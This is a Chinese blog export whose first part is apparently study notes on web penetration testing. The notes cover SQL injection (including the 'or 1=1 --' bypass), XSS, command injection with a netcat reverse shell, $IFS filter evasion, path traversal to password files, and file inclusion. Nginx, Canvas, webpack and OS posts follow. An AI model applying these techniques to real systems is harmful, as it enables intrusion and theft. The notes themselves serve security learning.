Grep 功能），用来识别预示漏洞可能存在的响应，例如： 另外文件包含漏洞需要搭建一个 Web 服务并监控收到的请求，以便当漏洞存在时，应用程序可向该 Web 服务发送请求； 手工检查筛选出的所有异常响应，包括 HTTP 状态码、响应长度、响应时间、响应内容等； 根据异常内容，分析其可能存在的漏洞，对漏洞位置再次进行确认，并思考如何利用这些漏洞； 一旦配置完毕，完成对某个请求的模糊测试后，接下来对其他请求进行测试就可以开始快速自动化了； 如果在解析应用程序的过程中，发现应用程序使用某种带外通道来传输可由用户控制的数据，也不要遗漏利用这些通道提交测试请求；为了让测试更高效，可自定义测试脚本； 除了手动测试外，还可以运行自动化的扫描器，并比较手工和自动两份结果，兼听则明； 测试 SQL 注入在模糊测试过程中，如果发现某个位置可能存在 SQL 注入漏洞，则可进一步手工详细探查； 分析错误消息的语义（常用数据库软件的语义可参数第 9 章）； 当在模糊测试过程中提交一个单引号触发异常时，可在请求中提交两个单引号形成配对，看异常是否会消失；如果会的话，则说明漏洞很可能存在； 使用 SQL 连接符构建一个良性输入，然后观察它的响应是否跟未使用连接符的情况相同；如果会的话，说明漏洞可能存在（记得对字符器进行 URL 编码）； 如果正常的参数中包含数字，则可以使用表达式来替代数字，表达式的计算结果跟原值相同；如果响应程序能够正常响应，则说明漏洞很可能存在； 如果前面的步骤发现潜在漏洞后，可尝试提交针对 SQL 设计的数学表达式，构造一个特殊的值，来进一步确定漏洞。如果请求能够成功，则可以几乎肯定漏洞存在。表达式示例：，两个表达式的结果都为 2； 如果在请求参数中使用 waitFor 命令可以造成响应的明显延迟，则说明后端数据为 MS-SQL，且漏洞可能存在；可手动设置 waitFor 为不同大小的值，看是否响应时间会出现对应的变化。（可以同时在多个 SQL 查询中插入 waitFor，理论上响应时间会呈现为预置值的固定倍数）； 如果应用程序存在 SQL 注入漏洞，则应考虑这个漏洞可以用来做点什么其他的，例如： 通过修改 WHERE 子句中的条件，改变应用程序的逻辑（例如通过 or 1=1 -- 来避开登录限制）； 通过 UNION 操作符注入 SELECT 查询，将查询结果跟原始查询结果组合在一起； 通过 SQL 指纹语法来探测后端的数据库类型； 如果是 MS-SQL 数据库，并且应用程序会在响应中返回 ODBC 错误消息，则可以利用错误消息，获取任意的数据； 如果上一步行不通，可以尝试以下技巧来提取数据： 获取字符串数据的数字格式，一次提取一个字节； 使用带外通道； 如果可以根据条件判断获取不同的响应，则可以通过 abcinthe 一次一比特的提取数据； 如果可以根据条件触发延迟，则可以用延迟与否来提取数据，也是一次一比特； 如果应用程序对某些字符串和表达式实施过滤，尝试第9章的技巧避开过滤； 如有可能，利用漏洞以及功能强大的数据库函数，将攻击范围扩大到数据库和基础服务器； 测试 XSS 和其他响应注入确定反射位置 基于模糊测试得到的结果，先进行分类（例如 Burp 中可使用 “有效载荷 grep“ 来分类），然后查看哪些位置原样返回了 XSS 测试字符串； 查看字符串的位置 如果出现在响应主体中，可测试 XSS 漏洞； 如果出现在 HTTP 消息头中，可测试消息头注入漏洞； 如果出现在 302 响应的 Location 字段中，可测试重定向漏洞； 同一个请求参数，可能出现在多个位置，表明应用程序有可能同时存在多种漏洞； 测试主体注入 当请求参数值反射在响应主体中时，观察反射位置周围的 HTML 写法，思考如何针对性的设计相应的注入内容，以便可以执行任意的 JS 脚本，例如可通过注入 script 标签 + JS代码来实现，也可以注入到 HTML 标签属性值； 尝试向应用程序提交各种可能的内容，并监控它的响应，看应用程序是否采用某种过滤和净化机制； 如果发现有过滤机制，则在设计注入内容时，可参考第12章提到的各种技巧，避开这些检查，让浏览器能够执行预期的脚本； 如果 XSS 漏洞是 POST 类型，一种利用方法是建立第三方恶意站点，诱使用户发出 POST 请求； 测试消息头注入 如果反射出现在响应的报头部分，则尝试在参数中发送经过 URL 编码的回车和换行符，看它们是否能够在响应中返回（返回后的符号应不再是 URL 编码，而是已经解码）； 如果在返回的响应中发现新增了一行，则说明漏洞很可能存在；可根据第 13 章的技巧进行攻击； 如果在请求中发送两个换行符，但在响应中只返回一个，则可以根据情况尝试设计利用漏洞的办法； 如果应用程序实施某种过滤机制，则可以考虑通过以下技巧来规避： 测试任意重定向 如果反射出现在重定向内容中，则可以尝试利用漏洞，将重定向指向某个专门设计的钓鱼网站，提升网站的可信度； 如果请求参数发送的是绝对 URL，则尝试修改该 URL 中的域名，看是否会重定向到指定的域； 如果请求参数发送的是相对 URL，则尝试将其修改为绝对 URL，看是否会重定向到指定的域； 如果应用程序为了防御重定向漏洞，实施一定的过滤机制，则可尝试使用第 13 章的技巧来规避过滤； 测试保存型攻击 很多应用程序都有保存用户输入的功能，并在之后的某个功能中返回保存的数据。如果在模糊测试过滤中，发现响应中出现了匹配字符串（这些字符串不一定是在当前请求中提交的），则可以尝试找一下初始是哪个请求发送的数据； 有时候需要完成多阶段步骤，数据才能保存成功。此时可尝试手动完成所有步骤，然后检查数据是否保存成功并返回； 如果应用程序有垂直权限控制，则可以尝试登录高权限的账号，然后看其是否能够使用某个功能去查看低权限账号的数据。如果可以并存在保存型漏洞的话，那么这个漏洞很可能可以用来提升低权限账号的权限； 查找所有保存用户提交的数据的情况，并测试其是否也包含 XSS 漏洞和其他响应注入漏洞； 如果某个用户提交的数据，可以被其他用户查看，则漏洞可能被用来实施会话劫持攻击或者请求伪造攻击； 如果某个用户提交的数据，仅自己可以查看，则可以尝试配合其他漏洞，修改其他用户的数据，让其包含恶意脚本； 如果应用程序支持文件的上传和下载，则可以进一步分析是否允许上传 HTML、JAR或者文本文件，并且没有过滤其中包含的内容，那么很大概率存在漏洞。 如果应用程序允许上传 JPEG 图片，但没有检测是否包含有效的内容，则可用来实施针对 IE 用户的攻击； 注意测试应用程序如何对不同类型的文件做出处理，以及浏览器如何处理包含 HTML 而非正常内容，以便有针对性的设计内容，实现预期的目的； 如果应用程序对保存型 XSS 漏洞实施过滤机制，则分析这种过滤机制是否导致其出现本站点请求伪造的漏洞； 测试 OS 命令注入 当发送有效的命令注入攻击荷载后，如果应用程序的响应时间出现延迟，则可以进一步手动测试，修改参数值，看响应时间是否会随着参数值的变化而变化； 针对找到每一个可注入命令的攻击字符串，尝试将其修改为更加有用的命令（例如 ls、dir 等），然后检查命令的结果能否返回到浏览器； 如果可以就最好，如果不行，则可以尝试以下办法： 尝试建立带外通道：例如通过 TFTP 上传一些工具到服务器，然后使用 telnet 或者 netcat 和本地主机建立一个反向 shell，也可使用 mail 命令通过 SMTP 机制发送命令结果； 可以尝试将结果的内容输出到 Web 根目录下的某个文件，然后使用浏览器访问它们； 当找到命令注入办法并能够获得命令结果后，下一步是确定权限（例如使用 whoami 命令，或者向一个受保护的目录写入一个文件）； 如果权限很高就最好，如果比较低，就尝试设法提升自己权限，以便可以访问应用程序的所有敏感数据，或者通过被攻破的主机，访问同一网络中的其他主机； 如果已经确定请求中的参数会被提交给某个 OS 命令，但发送的攻击字符串无法攻击成功，则可以尝试使用 > 和 < 两个符号，将某个文件作为命令的输入，或者作为命令的输出；通过这种方法，可以读取和写入任意内容到文件中； 如果能够猜到应用程序执行的命令名称，则可以尝试在请求中携带该命令支持的选项，以便更好的利用命令； 如果发现应用程序针对注入实施过滤防御，则可以尝试在提交的字符串中插入转义字符，看应用程序是否会对转义字符进行转义，如果不会的话，就可以利用这个漏洞避开过滤机制； 如果发现空白符号被过滤，可以尝试使用 $IFS 来替代 UNIX 系列操作系统中的空格； 测试路径遍历 基于模糊测试的结果，先进行分组，然后手动检查响应，看响应中是否包含了特定文件的内容，或者某些表示异常的信号； 从解析应用程序的结果中，找出那些基于用户输入读取或写入文件的功能。手动测试该功能，看是否存在路径遍历漏洞； 如果某个参数包含一个文件名、目录名或者部分文件分，尝试修改该参数值，插入子目录或者遍历序列， 如果响应相同，则说明应用程序存在漏洞；如果响应不同，则说明应用程序对输入实施了某种过滤机制； 如果插入序列成功，则尝试上溯到根目录，并访问服务端操作系统中的已知文件； 如果访问失败，则说明应用程序实施了某种过滤机制，深入分析其过滤原理，以便找出规避办法； 有些应用程序可能会检查文件的扩展名，以限制用户只能访问特定类型的文件；尝试使用空字节或换行符来规避，在空字节或换行符之后，再接上正确的扩展名； 有些应用程序，可能会检查用户输入的文件名，是否以特定的单词做为开头，此时可以将遍历序列放在该特定单词后面，以避开过滤； 如果以上攻击办法都失败了，则可以尝试组合攻击。先对基础目录进行全面的测试，以了解应用程序实施的过滤机制和处理异常输入办法； 如果能够读取服务器上的任意文件，尝试读取以下文件，以扩大攻击范围： 操作系统与应用程序的密码文件； 服务器与应用程序的配置文件（可用来发现其他漏洞或者优化已知漏洞的攻击办法）； 可能包含数据库访问凭据的文件； 应用程序的数据源，例如 MySQL 或 XML 文件； 程序的源代码，以便可以进行源代码审查发现更多漏洞，以及优化现在漏洞的攻击； 可能包含用户名和会话的日志文件； 如果能够写入任意文件，可尝试实施以下攻击： 在用户的启动文件夹中创建脚本； 当用户下一次连接时，修改 in.ftpd 等文件执行任意命令； 向应用程序放置可执行文件的目录中，写入脚本，以便浏览器可以访问它们； 测试脚本注入 模糊测试的时候，一般会在请求中发送 111111 字符串测试是否存在脚本注入漏洞；因此，可以在响应中搜索 11111 字符串，看注入是否成功； 检查脚本注入测试的响应中，是否包含错误消息，如果包含，说明输入的脚本被执行，预示漏洞存在； 如果发现的漏洞，则根据应用程序所使用的脚本语言类型，针对性的设计待注入的脚本，以便可以被应用程序正确的执行； 测试文件包含 在模糊测试时，有架设一台远程文件服务器，监控是否收到应用程序的请求。如果收到了，说明存在文件包含漏洞； 以单线程的方式，重复相关的测试，确定具体是哪些参数，触发了应用程序的请求； 另外，还需要检查测试结果中，存在响应异常延迟的结果。因为有些应用程序发出的请求可能因为网络过滤超时了，导致请求没有被远程文件服务器监控到。 如果发现远程文件包含漏洞，在远程文件服务器上，放置针对应用程序所使用的脚本语言编写的恶意脚本。然后检查这些脚本是否会应用程序被下载和执行； 测试特殊功能的输入漏洞有些输入漏洞，仅在一些特殊功能中才会出现，常见场景如下： 测试 SMTP 注入 如果应用程序包含与电子邮件有关的功能，则轮流提交以下字符串作为每一个参数，并在对应的位置插入电邮地址（Burp 中会自动完成这项任务的功能，以下字符串已经完成了 URL 编码，因此无须再次编码）： 检查应用程序返回的响应，看是否包含错误消息，如果消息内容跟电子邮件相关，确定是否可以调整输入，以便利用漏洞； 监控插入的邮件地址的邮箱，看是否收到应用程序发出的邮件； 仔细检查请求中的 HTML 表单，里面可能隐藏着一些有用的线索，例如表单中的某个隐藏或者禁用的字段，可能用来指定收件人地址，尝试对其进行修改； 测试编译型组件漏洞测试缓冲区溢出 向每个目标参数，轮流提交一系列稍大于常用缓冲区大小的长字符串，一次仅对一个参数实施攻击，以便最大限度的覆盖应用程序中的所有代码路径（可使用 Burp 中的有效字符块攻击荷载，做为自动生成不同长度字符串的源数据）；常见的长度为：1100（稍大于 1024）， 4200（稍大于4096），33000（稍大于32768）； 监控应用程序是否出现异常响应；任何未加以控制的溢出，几乎都会造成应用程序出现异常，只是此时客户端不容易进行远程诊断，可以尝试寻找以下反常现象： HTTP 500 状态码； 内容详细的消息，提示某个外部组成发生故障； 只收到局部或畸形的响应； TCP 连接未返回响应，突然中断； 整个 Web 程序停止响应； 响应内容包含莫名其妙的结果，此时可能意味着内存中的数据窜了； 测试整数漏洞 在测试编译型组件时，找出所有整数类型的数据，特别是长度指标符，因为很可能可以利用它来触发漏洞； 向每个目标参数，轮流提交一系列边界值（包含有符号和无符号两种类型），常见值如下： 当数据以十六进制表示时，此时可分别测试大端法和小端法两个版本；如果十六进制值以 ASCII 编码提交，则注意使用合法字符，以便提交的输入可以被应用程序正确编码； 监控应用程序的响应，寻找异常事件（方法同缓冲区溢出漏洞）； 测试格式化字符串漏洞 轮流向每一个参数提交包含一大溜各种格式说明符的字符串，示例如下： 监控应用程序的反应，留意异常事件； 测试 SOAP 注入 SOAP：simple object access protocol，用于在 Web 应用中传输结构化的消息（如对象）的一种协议，它使用 XML 作为数据格式，并依赖于应用层协议如 HTTP 来实现消息传递；相对于 JSON，SOAP 更加复杂一些，因为它不像 JSON 只负责数据，还负责数据传输、检验、权限等，它本质上是一个协议，因此它的处理速度要慢一些。JSON 只完全只管数据本身，其他工作都是交给开发者另行处理。 找出很可能使用 SOAP 处理的参数，尝试提交一个包含 XML 结束符的标签，例如 如果出现错误，说明漏洞可能存在；如果没有错误，说明存在净化过滤机制； 当出现错误时，尝试提交一对包含起始和结束的标签，例如 ，如果错误消失，则说明漏洞存在； 如果提交的攻击字符串在响应中原样返回，则尝试依次提交下面两个值，如果其中一个值的返回结果为另外一值，或者只是返回 test，那么说明插入成功了 如果请求包含多个被 SOAP 处理的参数，尝试在一个参数中插入起始注释符，在另外一个参数中插入结束注释符。由于不知这些参数的处理顺序，因此应该尝试各种组合。 监控应用程序是否出现异常（当插入成功时，会注释部分 SOAP 数据，导致应用程序的逻辑出现异常）； 测试 LDAP 注入 Lightweight directory access protocol，用来访问目录的一种协议 如果应用程序包含某个使用 LDAP 协议和用户提交的参数来访问目录的功能，则针对每一个参数，轮流测试是否可以注入 LDAP 查询； 当在参数中包含 * 字符时，如果返回大量结果，则说明很可能使用 LDAP 进行查询； 尝试输入大量右括号，例如 )))))))))，如果输入导致查询错误或异常，则说明存在漏洞（右括号是常用的关键字，会使得应用程序的逻辑出现失效，因此，不仅 LDAP，应用程序中的许多其他功能都有可能失效）； 尝试输入各种干扰查询的表达式，看是否会影响查询结果；例如使用 cn， 尝试在输入结尾增加其他关键字，并用逗号分隔这些关键字；轮流测试每一个关键字，常见的关键字如下： 测试 XPath 注入 XPath 是一个用来读取 XML 内容的工具 尝试提交以下值，看是否会导致异常响应，但不至于造成报错： 如果参数为数字，则可以尝试提交以下表达式： 如果以上测试会导致应用程序返回异常结果，但没有报错，则说明漏洞很可能存在。可以尝试通过针对性设计的输入，一次提取一个字节的信息，从而获得任意的数据。例如，使用以下字符串尝试获取当前节点的父节点的名称： 得到父节点名称后，可以使用以下输入提取 XML 树中的所有数据： 测试外部请求注入 留意参数中是否包含表示内部某个服务名称，或者 IP 地址的情况，如果有的话，说明应用程序的某个功能需要访问其内部服务；此时可提交任务的服务名称和端口，观察响应是否出现超时。 另外也可以提交 localhost 和当前机器的 IP 地址，之后监控是否会接收到连接请求； 如果应用程序的某个功能会根据参数值返回特定的内容，则尝试在注入额外的参数值，观察响应结果是否不变，例如可注入： 如果响应内容不变，则说明没有检查额外参数注入，有可能存在参数注入漏洞。此时，如果恰好注入某个正确命名的键值对，有可能会改变应用程序的处理逻辑； 测试 XXE 注入 XXE：或许是 XML external enterty 的缩写？ 由于 XML 语法支持引用外部内容，因此当用户向服务器提交 XML 时，有可能可以实施外部实体注入攻击； 当应用程序返回所提交的 XML 中的某个节点值时，则\\通过实体注入并赋值给相应字段，来获取外部内容；例如： 如果不知道返回的字段名称，则可以通常观察响应时间是否超时来判断是否注入成功，方法将外部实体设置为某个不存在的外部服务，例如 “","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Nginx 常用配置","slug":"Nginx 配置","date":"2020-11-12T09:08:00.000Z","updated":"2024-09-21T23:17:30.842Z","comments":true,"path":"2020/11/12/Nginx 配置/","permalink":"http://example.com/2020/11/12/Nginx%20%E9%85%8D%E7%BD%AE/","excerpt":"","text":"1.限速 Rate Limiting基本原理使用了水池算法，即水池的流入水量代表进入的请求，水池的流出水量代表转发请求给应用程序；当设置了某个水池的容量后，如果在某段时间，流入的水量比较大，超过了流出的水量，将导致水池中的水溢出；溢出的水即代表被拒绝的请求； 实现办法基本设置limit_req_zone 表示限速区域 第一个参数表示限速匹配条件的关键字，此处为二进制的IP地址 $binary_remote_addr； 第二个参数表示限速区域名称，此处为 mylimi，冒号后面表示用来存储请求数据的内存空间大小，此处设置为 10MB（每 MB 大约可以存储 16000 个二进制 IP 地址，因此 10 MB 大约可以存储 16万个IP地址）； 第三个参数 rate 表示限制的速度，此处为 10r&#x2F;s，表示每秒10个请求，也即每 100 毫秒 1 个请求； 12345678limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;server &#123; location /login/ &#123; limit_req zone=mylimit; // 在某个路径 location 中定义 zone，表示对当前路径进行限速 proxy_pass http://my_upstream; &#125;&#125; 应对突发当第二个请求到达的时间，距离上一个请求的时间少于100毫秒时，Nginx 将返回 503 的响应；为了解决突发的高峰访问的场景，引入了另外两个控制限速的关键字，分别如下： 12345location /login/ &#123; limit_req zone=mylimit burst=20 nodelay; proxy_pass http://my_upstream;&#125;： burst 表示增加一个等待队列，当下一个请求距离上一个请求少于 100 毫秒时，就先将其放入队列中；此处 burst&#x3D;20 表示同时最多可以有20个请求在排队；如果某个请求进来时，前面已经 20 个请求在排除，则该请求将被拒绝； 免等待队列虽然 burst 为突发的访问高峰的请求增加了一个缓冲的机制，但它的缺点是让响应变慢了，因为有些请求，例如队列中的第 20 个请求，将等候 2 秒钟的时间后，再会转发给应用程序进行响应；为了避免等待，引入了 nodelay 关键字，它表示请求到达后，将立即被转发给应用程序进行处理，不需等待，但是仍然会占用队列中的一个等待名额；这意味着如果某个时刻同一个 IP 同时发送 21 个请求，则前面 20 个请求将直接转发给应用程序处理，而第 21 个将被拒绝；队列中占用的名额每 100 毫秒释放一个； 两阶段限速123456789limit_req_zone $binary_remote_addr zone=ip:10m rate=5r/s;server &#123; listen 80; location / &#123; limit_req zone=ip burst=12 delay=8; proxy_pass http://website; &#125;&#125; 此处仍然建立了能够应对额外 12 个突发请求的队列，但是增加了 delay 参数，并将值设置为 8，它表示队列中的前 8 个请求使用免等待策略，而剩下的 4 个请求需要等待；此时如果进行第 13 个请求，将被拒绝； 高级设置白名单 先通过 geo 指令建立了一份白名单，普通请求的 $limit 值被默认设置为为 1，指定 IP 段的请求则被设置为 0 ； 再通过 map 指令将 $limit 值为 1 的请求的 $limit_key 属性值设置为 $binary_remote_addr，将$limit 值为 0 的请求设置为空字符串； 最后在 limit_req_zone 指令中，$limit_key 的值若为空字符串的请求，将被忽略，不会施加限制； 1234567891011121314151617181920geo $limit &#123; default 1; 10.0.0.0/8 0; 192.168.0.0/24 0;&#125; map $limit $limit_key &#123; 0 &quot;&quot;; 1 $binary_remote_addr;&#125; limit_req_zone $limit_key zone=req_zone:10m rate=5r/s; server &#123; location / &#123; limit_req zone=req_zone burst=10 nodelay; # ... &#125;&#125; 单个路径使用多个 limit_req当使用多个 limit_req 时，如果一个请求被多个 limit_req 同时匹配到，则最长 delay 时间的那个将生效；如果被任意一个 limit_req 拒绝，则请求将拒绝； 1234567891011121314http &#123; # ... limit_req_zone $limit_key zone=req_zone:10m rate=5r/s; limit_req_zone $binary_remote_addr zone=req_zone_wl:10m rate=15r/s; server &#123; # ... location / &#123; limit_req zone=req_zone burst=10 nodelay; limit_req zone=req_zone_wl burst=20 nodelay; # ... &#125; &#125;&#125; 其他配置项日志被延误的请求将记录在 warn 日志中；被拒绝的请求将请求在 error 日志中； 12015/06/13 04:20:00 [error] 120315#0: *32086 limiting requests, excess: 1.000 by zone &quot;mylimit&quot;, client: 192.168.1.2, server: nginx.com, request: &quot;GET / HTTP/1.0&quot;, host: &quot;nginx.com&quot; 但是可以手工指定日志等级，以下示例即为指定日志等级为 warn； 123456location /login/ &#123; limit_req zone=mylimit burst=20 nodelay; limit_req_log_level warn; proxy_pass http://my_upstream;&#125; 当请求被拒绝时，默认是返回 503 的错误码，如有需要，可以手工设置，以下示例设置为 444 1234location /login/ &#123; limit_req zone=login burst=4 nodelay; limit_req_status 444;&#125; 如果某个路径需要拒绝所有请求，则可以通过设置 deny all 实现； 123location /foo.php &#123; deny all;&#125;","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"Canvas 用法","slug":"Canvas 用法","date":"2020-11-10T08:12:00.000Z","updated":"2024-09-21T23:13:28.656Z","comments":true,"path":"2020/11/10/Canvas 用法/","permalink":"http://example.com/2020/11/10/Canvas%20%E7%94%A8%E6%B3%95/","excerpt":"","text":"功能canvas 是一个 HTML 标签，表面上看上去跟其他 HTML标签没有太大差别；但是通过它，可以在它所占据的区域中，绘制所需要的图形 用法基本用法首先需要在 HTML 文件中建立一个 canvas 标签； 1&lt;canvas id=&#x27;tutorial&#x27; width=&#x27;150&#x27; height=&#x27;150&#x27;&gt;&lt;/canvas&gt; 其次通过选择器选中它，调用它的 getContext() 方法，获得它的上下文对象，这个上下文对象后续要用来画图； 12var canvas = document.getElementById(&#x27;tutorial&#x27;);var context = canvas.getContext(&#x27;2d&#x27;); // 此处的参数 2d 表示获取 2d 类型的上下文对象，以绘制 2d 图形 canvas 有多种上下文对象，可以用来绘制不同类型的图片，例如 2D 图形、3D 图形；在调用 getContext 方法时，需要传入类型的参数，这样才能返回对应类型的上下文对象； 以下是完整的 HTML 文件内容 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;title&gt;Canvas tutorial&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function draw() &#123; var canvas = document.getElementById(&#x27;tutorial&#x27;); if (canvas.getContext) &#123; var ctx = canvas.getContext(&#x27;2d&#x27;); &#125; &#125; &lt;/script&gt; &lt;style type=&quot;text/css&quot;&gt; canvas &#123; border: 1px solid black; &#125; &lt;/style&gt; &lt;/head&gt; &lt;!--监听页面的 onload 事件；完成后触发 draw() 函数--&gt; &lt;body onload=&quot;draw();&quot;&gt; &lt;canvas id=&quot;tutorial&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;/canvas&gt; &lt;/body&gt;&lt;/html&gt; 绘制形状尝试在页面上绘制两个不同颜色的相互重叠的正方形 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;script type=&quot;application/javascript&quot;&gt; function draw() &#123; var canvas = document.getElementById(&#x27;canvas&#x27;); if (canvas.getContext) &#123; var ctx = canvas.getContext(&#x27;2d&#x27;); ctx.fillStyle = &#x27;rgb(200, 0, 0)&#x27;; ctx.fillRect(10, 10, 50, 50); ctx.fillStyle = &#x27;rgba(0, 0, 200, 0.5)&#x27;; ctx.fillRect(30, 30, 50, 50); &#125; &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload=&quot;draw();&quot;&gt; &lt;canvas id=&quot;canvas&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;/canvas&gt; &lt;/body&gt;&lt;/html&gt; 最终执行效果如下： 知识点：ctx 的方法并不是一次性的，而是可以多次重复调用的，每调用一次，都会根据参数产生一次效果，可以理解为 ctx 就像画笔一样，每调用一次画笔的方法，都会画上相应的效果；多次调用，就会有多个效果； canvas 原生只支持两种形状，一个是长方形，一个是路径（即由点连接起来的线）；其他图形都可以通过路径来实现；幸运的是，有一堆提供定义好的函数，可以操作路径生成常见的形状，甚至是复杂的图形，而无须直接通过绘制线来实现； 绘制长方形的函数共有三个： fillRect(x, y, width, height): 绘制有填充颜色的长方形 strokeRect(x, y, width, height): 绘制没有填充颜色的长方形，也即只有轮廓； clearRect(x, y, width, height): 将指定位置的长方形区域擦除掉，变成完全透明的； 12345678910function draw() &#123; var canvas = document.getElementById(&#x27;canvas&#x27;); if (canvas.getContext) &#123; var ctx = canvas.getContext(&#x27;2d&#x27;); ctx.fillRect(25, 25, 100, 100); // 绘制尺寸为 100 正方形 ctx.clearRect(45, 45, 60, 60); // 将内部 60*60 的区域挖空 ctx.strokeRect(50, 50, 50, 50); // 在挖空区域画一个 50*50 的正方形轮廓 &#125;&#125; 结果如下： 注意：长方形的三个函数在调用后，会在画布上立即产生绘制后的效果；但路径相关的函数并非如此； 基于图像绘制drawImage 方法的第一个参数 image 有特殊的类型要求，一般是通过 canvas.createImage 方法来创建一个空白图像对象 img ，然后给 img 的 onload 方法添加回调函数，表示当图片加载完成后将执行的动作，之后给 img 的 src 赋值图片的 URL 或本地路径（赋值后会触发 onload 事件） 123456const img = canvas.createImage();img.onload = () =&gt; &#123; console.log(&#x27;img onload done.&#x27;);&#125;img.src = &quot;http://img.url.com&quot;context.drawImage(img, 0, 0); 缩放剪裁drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight) 123456789&lt;html&gt; &lt;body onload=&quot;draw();&quot;&gt; &lt;canvas id=&quot;canvas&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;/canvas&gt; &lt;div style=&quot;display:none;&quot;&gt; &lt;img id=&quot;source&quot; src=&quot;https://mdn.mozillademos.org/files/5397/rhino.jpg&quot; width=&quot;300&quot; height=&quot;227&quot;&gt; &lt;img id=&quot;frame&quot; src=&quot;https://mdn.mozillademos.org/files/242/Canvas_picture_frame.png&quot; width=&quot;132&quot; height=&quot;150&quot;&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 123456789function draw() &#123; var canvas = document.getElementById(&#x27;canvas&#x27;); var ctx = canvas.getContext(&#x27;2d&#x27;); // Draw slice ctx.drawImage(document.getElementById(&#x27;source&#x27;), 33, 71, 104, 124, 21, 20, 87, 104); // Draw frame ctx.drawImage(document.getElementById(&#x27;frame&#x27;), 0, 0);&#125;","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"为什么需要 webpack","slug":"为什么需要 webpack","date":"2020-10-26T08:57:00.000Z","updated":"2024-09-21T23:13:05.682Z","comments":true,"path":"2020/10/26/为什么需要 webpack/","permalink":"http://example.com/2020/10/26/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%20webpack/","excerpt":"","text":"在 HTML 网页中使用 js 去完成某些功能的时候，有两种处理办法： 按功能划分为多个 js 文件，在适当的位置以正确的顺序引入该 js 文件（因为文件之间可能存在依赖关系）； 将所有功能放在一个大的 js 文件中，一次性引入； 这两种方法有各自的优缺点，前者容易维护，但是多次引入需要牺牲一些性能；后者没有性能问题，但将所有 js 代码放在一个文件中，给维护和扩展增加了难度；Webpack 的出现，即是为了解决这个问题，它让我们的 js 代码可以分模块来编写，以提高可维护性；然后在正式使用时，它帮我们将多个 js 文件合成一个，这样在网页中可以一次性的引入，避免带来多次引入的性能问题；","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"操作系统导论","slug":"操作系统导论","date":"2020-09-20T14:02:00.000Z","updated":"2024-09-22T23:08:43.601Z","comments":true,"path":"2020/09/20/操作系统导论/","permalink":"http://example.com/2020/09/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%AE%BA/","excerpt":"","text":"1. 操作系统介绍操作系统的目标 对硬件进行抽象，使得对它们的调用变得简单易用；（易用） 对数据进行持久保存，避免丢失；（存储） 对程序进行隔离，避免出现隐私或安全问题；（安全） 持久可靠的工作，不轻易发生故障；（可靠） 操作系统的历史 库时代：让应用程序可以通过引用库来调用硬件；缺点：应用程序的权限很大，可以无限制的访问所有硬件资源以及其上的数据，缺少安全保护机制； 模式时代：引入了系统调用，应用程序只跑在用户模式下，权限受到限制；系统级别的功能通过系统调用 API 来实现，调用后，系统级别的代码跑在内核模式下，拥有最高权限；限制了应用程序能够操作的范围； 分时时代：随着 CPU 相对 I&#x2F;O 设备和存储设备的速度越来越快，为了避免浪费 CPU 资源，引入分时共享，实现多个程序并行的机制； 隔离时代：为了避免程序之间相互影响，引入了虚拟内存，以便对内存进行保护； 现代：在小型机之后，个人计算机开始兴起，早期的 DOS 和 MacOS 并没有借鉴小型机的操作系统，走了弯路；之后开始进行调整，MacOS 借鉴了 UNIX 的思想，而微软则推出 Windows NT（此处的 NT 表示新技术，new technology），让局面得以改善；UNIX 由于版本官司，导致其发展受到阻碍，之后 Linux 借鉴了其思路，重写了代码，绕开了版权问题，并通过开源快速发展了起来； 2. 抽象：进程操作系统其实要面临三种角色的使用者，包括个人用户、应用程序开发者、硬件设备生产商等；不同的使用者会使用不同的视角，来看待操作系统提供的功能； 进程简介进程是一种 CPU 虚拟化技术，实际的物理 CPU 可能只有一个，但是通过分时共享（time sharing）技术，让不同的应用程序轮流使用 CPU，这样在应用程序的眼里，只需要将 CPU 当作自己独自拥有的并进行调用就可以了，简化了应用程序对 CPU 调用的复杂度； 事实上应用程序根本就不发起对 CPU 的调用，而只是按顺序准备好所有的指令，等待着被 CPU 依次执行；看起来就好像 CPU 一直为其工作一样，而不是仅在需要的时候，才通过系统调用来让 CPU 为自己工作；这跟调用其他硬件设备不太一样；因为每一条指令的执行，都是需要 CPU 的，所以其实也算是持续的做 CPU 调用； 进程技术更像是一种执行程序的抽象，即通过创建进程来执行程序，简化了执行程序所要的一系列准备工作； 进程 API操作系统提供了一些进程的 API 接口，这些接口即可以被用户使用，也可以被应用程序使用； 创建进程； 销毁进程； 等待进程； 查询进程状态； 暂停&#x2F;恢复进程； 进程创建细节当创建一个新进程时，操作系统有一系列的工作需要完成，包括创建新页表、从磁盘加载应用程序的指令到内存、为变量分配内存（栈和堆）完成初始化、更新页表的映射、分配文件描述符、开始执行应用程序的第一条指令等； 进程的状态一个进程表示一个正在运行中的程序，它有三种状态：运行中、阻塞中、就绪中；当应用程序发起某些耗时较久的 I&#x2F;O 